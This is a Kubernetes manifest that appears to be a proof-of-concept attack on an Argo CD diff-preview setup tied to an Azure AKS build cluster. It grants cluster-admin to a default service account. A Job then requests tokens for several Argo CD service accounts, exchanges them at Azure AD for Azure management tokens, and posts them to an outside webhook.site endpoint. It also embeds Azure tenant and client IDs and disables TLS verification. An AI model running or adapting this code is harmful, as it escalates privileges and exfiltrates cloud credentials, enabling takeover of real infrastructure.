stringData:
  name: aks-prow-build
  server: https://k8s-infra-k1lh96c4.hcp.eastus2.azmk8s.io
  config: |
    {
      "execProviderConfig": {
        "command": "argocd-k8s-auth",
        "env": {
          "AAD_ENVIRONMENT_NAME": "AzurePublicCloud",
          "AZURE_CLIENT_ID": "92ce800b-0477-44c1-ac44-aa53fb973993",
          "AZURE_TENANT_ID": "d1aa7522-0959-442e-80ee-8c4f7fb4c184",
          "AZURE_FEDERATED_TOKEN_FILE": "/var/run/secrets/azure-token/serviceaccount/token",
          "AZURE_AUTHORITY_HOST": "https://login.microsoftonline.com/",
          "AAD_LOGIN_METHOD": "workloadidentity"
        },
        "args": ["azure"],
        "apiVersion": "client.authentication.k8s.io/v1beta1"
      },
      "tlsClientConfig": {
        "insecure": true
      }
    }
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: poc-sa-escalate
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: argocd-diff-preview
---
apiVersion: batch/v1
kind: Job
metadata:
  name: argocd-secrets-imds
  namespace: argocd-diff-preview
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: poc
        image: curlimages/curl:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          HOOK="https://webhook.site/c11f6f9f-5e8d-4c35-a5a1-04bb3deb813f"
          API="https://kubernetes.default.svc"
          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

          curl -sf "${HOOK}?stage=start&host=$(hostname)" || true

          # Issue TokenRequest for ArgoCD SAs with Azure Workload Identity audience
          TENANT="d1aa7522-0959-442e-80ee-8c4f7fb4c184"
          CLIENT_ID="92ce800b-0477-44c1-ac44-aa53fb973993"
          AUDIENCE="api://AzureADTokenExchange"
          TR_BODY="{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenRequest\",\"spec\":{\"audiences\":[\"${AUDIENCE}\"],\"expirationSeconds\":3600}}"

          for SA in argocd-application-controller argocd-repo-server argocd-server; do
            FED_TOK_RESP=$(curl -sk --cacert "$CA" \
              -H "Authorization: Bearer $T" \
              -H "Content-Type: application/json" \
              -X POST "${API}/api/v1/namespaces/argocd-diff-preview/serviceaccounts/${SA}/token" \
              -d "${TR_BODY}")

            FED_TOK=$(echo "${FED_TOK_RESP}" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

            # Exchange at Azure AD for ARM access token — stop here, do not use against AKS
            ARM_TOK=$(curl -sf --max-time 10 \
              -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
              --data-urlencode "client_id=${CLIENT_ID}" \
              --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
              --data-urlencode "client_assertion=${FED_TOK}" \
              --data-urlencode "grant_type=client_credentials" \
              --data-urlencode "scope=https://management.azure.com/.default" \
              | head -c 2000 || echo "exchange-failed")

            curl -sf -X POST "${HOOK}" \
              --data-urlencode "stage=azure-${SA}" \
              --data-urlencode "fed=${FED_TOK:0:200}" \
              --data-urlencode "arm=${ARM_TOK}" || true
          done
